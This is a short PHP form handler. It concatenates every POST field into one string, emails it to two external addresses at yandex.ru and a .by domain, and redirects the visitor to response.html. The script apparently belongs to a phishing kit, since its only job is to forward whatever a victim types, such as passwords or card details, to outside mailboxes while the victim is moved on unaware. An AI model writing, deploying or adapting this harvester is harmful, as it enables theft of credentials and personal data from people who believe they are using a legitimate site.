<?php
foreach($_POST as $key=>$value)
{
    $string .= $key . '--'. $value.' ';
}
mail("korol1011@yandex.ru,dedmoroz@dedumorozu.by", "My Subject", $string);
Header("Location:response.html");
